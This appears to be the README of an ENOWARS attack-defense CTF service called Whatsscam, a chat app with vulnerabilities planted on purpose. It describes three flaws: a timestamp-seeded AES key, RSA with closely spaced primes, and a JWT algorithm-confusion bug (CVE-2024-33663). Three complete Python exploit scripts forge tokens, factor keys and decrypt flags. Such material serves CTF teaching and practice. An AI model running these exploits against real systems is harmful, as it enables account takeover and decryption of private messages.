# Flagstores

There are 3 Flagstores:
- First inside the Groupchat messages.
- Second inside the private messages. 
- Third is inside the Status accessible via Profile or via Backup.

# Vulnerabilities

The service contains 3 vulnerabilities, exploits that are based on the enowars infrastructure are listed down below.

The exploits are also listed inside the ```checker/src/checker.py```.

## AES WEAK SEED GENERATOR

- Category: Misconfiguration
- Difficulty: Easy
- Position: Inside the Groupchats

The seed is just the timestamp therefore you can either bruteforce it or receive the timestamp of each note in Groupchats

## RSA WITH SEXY PRIMES

- Category: Crypto
- Difficulty: Medium-easy
- Position: Inside the Home/Private Messages

The base RSA function uses 2 prime numbers that are connected, called sexy primes because they are p = q + 6. This makes it possible to create the private key from the public key.

## AUTHLIB AUTHENTICATION 

- Category: Authentication
- Difficulty: Medium-hard
- Position: Backup
- CVE Number: CVE-2024-33663

The Backup token is vulnerable as the authlib does not differentiate between 2 algorithms. This makes it possible to not only authenticate/sign with the private key inside the token, but also create a token with the public key that will be handled the same way as the private key token. You can create a fake token via the userlist in which the public keys are listed than you can login in as if you would have the actual private key token.

# Example Exploits

None of the exploits are connected with each other.
All the exploits are also inside the ```checker/src/checker.py```.
The Exploits down below is an example exploit with the real enowars setup from a testrun.
The checker also contains a base version of the exploits. 


## Example Exploit 1
```bash
#!/usr/bin/env python3

import base64
import json
import random
import string
import sys
import threading
import time
import traceback
from typing import Optional

import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad


def random_number():
    random_number = random.randint(0, 2**128 - 1)
    return random_number.to_bytes(16, byteorder='big')


def aes_decrypt_specified_time(ciphertext_base64, time_str):
    # get current time from time_str
    time = time_str.split(':')
    seed = time[0] + time[1]
    random.seed(seed)

    key = random_number()
    nonce = random_number()

    ciphertext = base64.b64decode(ciphertext_base64)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    padded_plaintext = cipher.decrypt(ciphertext)
    plaintext_bytes = unpad(padded_plaintext, AES.block_size)
    return plaintext_bytes.decode()

TARGET = 'localhost'
TARGET1 = sys.argv[1] # The target's ip address is passed as an command line argument

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
    session = requests.Session()
    # TODO implement exploit

    # Get the cookie by signing up as a user
    # Define the registration endpoint and the data for the new user
    url = f"http://{TARGET}:9696/sign-up"  # Updated URL to match your Flask app's running port
    data = {
        "email": ''.join(random.choices(string.ascii_lowercase, k=10)) + "@example.com",
        "name": "New User",
        "password1": "securepassword",
        "password2": "securepassword",
        "public_key": "off"
    }

    # Perform the registration request
    response = session.post(url, data=data)
    cookies = {}

    # Check if registration was successful by looking for a success message in the response
    if "Account created!" in response.text:
        # Retrieve the session cookie
        cookies = session.cookies.get_dict()
        print("Registration successful!")
        print("Session cookies:", cookies)
    else:
        print("Registration failed!")
        print(response.text)

    r = session.get(f'http://{TARGET}:9696/creategroup/{hint}', cookies=cookies)

    # Get the contents of the <li class="list-group-item"> element
    content = r.text.split('<li class="list-group-item">')[1].split('</li>')[0]
    encrypted = content.split("\n")[1].strip()
    timestamp = content.split("\n")[2].strip().split(" ")[1]
    decrypted_flag = aes_decrypt_specified_time(encrypted, timestamp)

    # print decrypted flag
    print(decrypted_flag)


# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['Whatsscam'] # Get the information for the current target
threads = []
team_info = service_info[TARGET1]
for round_nr in team_info:
    round_info = team_info[round_nr]
    # Groups are in flagstore 1
    flag_store = '1'
    store_info = round_info[flag_store]
    for flag_info in store_info:
        # flag_info will always be a string, which you might have to parse with json.loads
        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
        t.start()
        threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)
```

## Example Exploit 2

As part of this exploit you will be able to see the original c file in the documentation folder that is used as a compiled version inside the service.

```bash
#!/usr/bin/env python3

import base64
import json
import random
import string
import sys
import threading
import time
import traceback
from typing import Optional
from bs4 import BeautifulSoup

import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from Crypto.PublicKey import RSA
from Crypto.Hash import HMAC, SHA256


def format_rsa_public_key(key_str):
    #byte_len = 32 #64
    byte_len = 64
    key_str = key_str.replace(" ", "").replace("\n", "")
    formatted_key = "-----BEGIN RSA PUBLIC KEY-----\n"
    
    # Split the key into 64-character lines
    for i in range(0, len(key_str), byte_len):
        formatted_key += key_str[i:i+byte_len] + "\n"
    
    formatted_key += "-----END RSA PUBLIC KEY-----\n"
    return formatted_key


def random_number():
    random_number = random.randint(0, 2**128 - 1)
    return random_number.to_bytes(16, byteorder='big')


def aes_decrypt_specified_time(ciphertext_base64, time_str):
    # get current time from time_str
    time = time_str.split(':')
    seed = time[0] + time[1]
    random.seed(seed)

    key = random_number()
    nonce = random_number()

    ciphertext = base64.b64decode(ciphertext_base64)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    padded_plaintext = cipher.decrypt(ciphertext)
    plaintext_bytes = unpad(padded_plaintext, AES.block_size)
    return plaintext_bytes.decode()

TARGET = 'localhost'
TARGET1 = sys.argv[1] # The target's ip address is passed as an command line argument

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
    session = requests.Session()
    # TODO implement exploit

    # Get the cookie by signing up as a user
    # Define the registration endpoint and the data for the new user
    url = f"http://{TARGET}:9696/sign-up"  # Updated URL to match your Flask app's running port
    data = {
        "email": ''.join(random.choices(string.ascii_lowercase, k=10)) + "@example.com",
        "name": "New User",
        "password1": "securepassword",
        "password2": "securepassword",
        "public_key": "off"
    }

    # Perform the registration request
    response = session.post(url, data=data)
    cookies = {}

    # Check if registration was successful by looking for a success message in the response
    # if "Account created!" in response.text:
    #     # Retrieve the session cookie
    #     cookies = session.cookies.get_dict()
    #     print("Registration successful!")
    #     print("Session cookies:", cookies)
    # else:
    #     print("Registration failed!")
    #     print(response.text)

    r = session.get(f'http://{TARGET}:9696/userlist', cookies=cookies)

    email = str(hint)
    soup = BeautifulSoup(r.text, "html.parser")
    li = soup.find_all("li")
    li = [x.text for x in li]
    li = [x.split(" ") for x in li]
    li = filter(lambda x: email + '\n' in x, li)
    li = filter(lambda x: x != '' and x != '\n' and x != email + '\n', list(li)[0])
    public_key = list(li)
    public_key = public_key[2]
    #print("das ist public:", public_key)
    
    public_key = format_rsa_public_key(public_key)
    public_key = public_key + "\n"
    PUBKEY = RSA.import_key(public_key)
    PUBKEY = PUBKEY.public_key().export_key(format='PEM')


    b64 = lambda x:base64.urlsafe_b64encode(x).replace(b'=',b'')
    payload = b64(b'{"alg":"HS256"}') + b'.' + b64(f'{{"email":"{email}"}}'.encode('utf-8'))
    hasher = HMAC.new(PUBKEY, digestmod=SHA256)
    hasher.update(payload)
    evil_token = payload + b'.' + b64(hasher.digest())
    evil_token = evil_token.decode()
    
    print('das ist token', evil_token)
    
    url = f"http://{TARGET}:9696/backup"  # Updated URL to match your Flask app's running port
    data = {
        "email_backup": str(hint),
        'token_backup': str(evil_token)
    }

    # Perform the registration request
    response = session.post(url, data=data)
    
    print(response.text)
    


# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).
# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['Whatsscam'] # Get the information for the current target
threads = []
team_info = service_info[TARGET1]
for round_nr in team_info:
    round_info = team_info[round_nr]
    # Groups are in flagstore 2
    flag_store = '2'
    store_info = round_info[flag_store]
    for flag_info in store_info:
        # flag_info will always be a string, which you might have to parse with json.loads
        t = threading.Thread(target=exploit, args=(flag_info, flag_store))
        t.start()
        threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)
```

## Example Exploit 3
```bash
#!/usr/bin/env python3

import json
import requests
import sys
import threading
import traceback
import string
import random
import time
from typing import Optional
import re
import gmpy2
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
from Crypto.PublicKey import RSA
import base64

#TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
TARGET = 'localhost'
def fermat(n : int, iterations = 1) -> int:
  '''Fermat factorisation, tries given number of iterations
  Return prime factor or 'None' '''
  m, perfect_square = gmpy2.iroot(n, 2)
  if perfect_square:
    return m
  else:
    m += 1
  for i in range(iterations):
    delta, perfect_square = gmpy2.iroot((m+i)**2 - n, 2)
    if perfect_square:
      return int(m + i - delta)


#print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
session = requests.Session()
password = ''.join(random.choices(string.ascii_letters, k = 10))
user = ''.join(random.choices(string.ascii_letters, k = 10))
# TODO implement exploit
ans = session.post('http://localhost:9696/sign-up', data = {'password1':  password, 'password2':password, 'name':user, 'email':user+'@bar.de'})
ans = session.post('http://localhost:9696/login', data = {'password':  password, 'email':user+'@bar.de'})
home = ans.text
messages = {user: msg for user,msg in re.findall(r'To: (.*)</br>\n            \n            (.*)', home)}
ans = session.get('http://localhost:9696/userlist')
data = re.findall(r'Email: (.*)<br>\n          PublicKey: (.*)', ans.text)
pubkeys = {u: RSA.import_key('-----BEGIN PUBLIC KEY-----\n'+n+'\n-----END PUBLIC KEY-----').n for u,n in data}
for user in messages:
    n = pubkeys[user]
    p = fermat(n)
    if p is None: 
        #print(f'{user} failed')
        continue
    q = n // p
    phi = (p-1)*(q-1)
    d = inverse(65537,phi)
    flag = long_to_bytes(pow(bytes_to_long(base64.b64decode(messages[user])), d, n))[-51:].decode()
    print(flag)
```

# Fixes

Easy fixes are blocked via the checker which checks for missing flags and missing content inside the service.

The Fixes are listed inside the documentation/fix.py . You will have to switch the lines of code to fix the service.

The Fixes listed are only part of all possible ways to fix the exploits.

# Checker

The Checker is a tool that checks the features of the service for its behavior.

For Whatsscam it sends http requests that try out a feature for example if you can text or add a certain person as a friend. It is used to prevent unintentional fixes or that someone turns off the service or any features. It is also used to simulate traffic for testing and to simulate regular traffic as usual for a real service. For details about the functions please look into the ```checker/src/checker.py``` or ```checker/src/checker_util_func.py```. 

If you wanna start the checker you use ```docker compose up --build``` inside the ```checker``` folder. 
